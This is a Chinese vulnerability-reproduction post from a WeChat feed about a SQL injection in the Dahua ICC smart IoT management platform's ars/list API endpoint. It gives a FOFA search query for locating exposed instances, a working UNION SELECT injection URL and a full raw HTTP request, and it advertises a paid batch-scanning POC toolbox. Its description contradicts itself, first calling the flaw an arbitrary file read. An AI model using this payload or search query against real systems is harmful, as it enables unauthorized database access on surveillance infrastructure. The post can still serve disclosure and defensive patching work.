---
title: 大华智能物联管理平台evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞 附POC
url: https://mp.weixin.qq.com/s/GbmIyGNB3Gd16n9RCCyPCg
source: Doonsec's feed
date: 2026-01-13
fetch_date: 2026-01-14T03:33:20.172481
---

# 大华智能物联管理平台evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞 附POC

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Ze2D4cdck2rc09cRrN61Jcd4S7ox1QEfIvAEeiacaUBoFAS5QFM8RAtgK0JlYdPMmapVOOwjE2tCg/0?wx_fmt=jpeg)

# 大华智能物联管理平台evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞 附POC

2026-1-13更新

南风漏洞复现文库

![]()

在小说阅读器中沉浸阅读

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

## 1. 大华智能物联管理平台简介

微信公众号搜索：南风漏洞复现文库
该文章 南风漏洞复现文库 公众号首发

本人只有 南风漏洞复现文库 和 南风网络安全 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。

大华ICC智能物联综合管理平台对技术组件进行模块化和松耦合，将解决方案分层分级，提高面向智慧物联的数据接入与生态合作能力。

## 2.漏洞描述

大华ICC智能物联综合管理平台对技术组件进行模块化和松耦合，将解决方案分层分级，提高面向智慧物联的数据接入与生态合作能力。该系统存在任意文件读取漏洞，会造成敏感信息泄露。大华智能物联管理平台evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞。

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

大华ICC智能物联综合管理平台
![大华智能物联管理平台evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3Ze2D4cdck2rc09cRrN61JcBNVtiaGgh4GVK29Wr2NcA0UgcwrIbhs6VvyXMUBLkbA81j1yt0HGMmA/640?wx_fmt=png&from=appmsg "null")

大华智能物联管理平台evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞

## 4.fofa查询语句

body="static/qwebchannel.js" && body="/客户端会小于800/"

## 5.漏洞复现

漏洞链接：https://xx.xx.xx.xx/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-

漏洞数据包：

```
GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Ze2D4cdck2rc09cRrN61JcYK7P5AoCdAL5vcuJ50OUEyicJfuhKePu261n53ibZapQoVDTwiazics9KQ/640?wx_fmt=jpeg&from=appmsg "null")

## 6.POC&EXP

本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全

1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。

2: 免登录，免费fofa查询。

3: 更新其他实用网络安全工具项目。

4: 免费指纹识别，持续更新指纹库。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Ze2D4cdck2rc09cRrN61JcYLKGyIZ1beLSRQqicFqLLO57G7JEibzJwTqNd6DlMCicrG9LbMK7eQgaQ/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Ze2D4cdck2rc09cRrN61JcbIW2z3FOAYavHK42b8ib38HWxdkgGa3dX4qtOK4FC55Iic0mSY3Vh00Q/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Ze2D4cdck2rc09cRrN61JcLK8ervias8Loeuw3XhpLGj21TdghsQUQ0jd8RI77H77icyB4iaYCrcricQ/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Ze2D4cdck2rc09cRrN61JcGVYlTogaQq8X5AM8CxV2iaWxujGtZ56FggDh7kjUibD6ibU3XOiaKA8njA/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Ze2D4cdck2rc09cRrN61JcEVzeFHmpZEVUpEMtanmGj5xI64lHsUwcfiajKoHAcUxcDlEwXmuGJ6A/640?wx_fmt=jpeg&from=appmsg "null")

## 7.整改意见

厂商尚未提供相关漏洞补丁链接，请关注厂商主页随时更新： https://www.dahuatech.com/

## 8.往期回顾

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

南风漏洞复现文库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过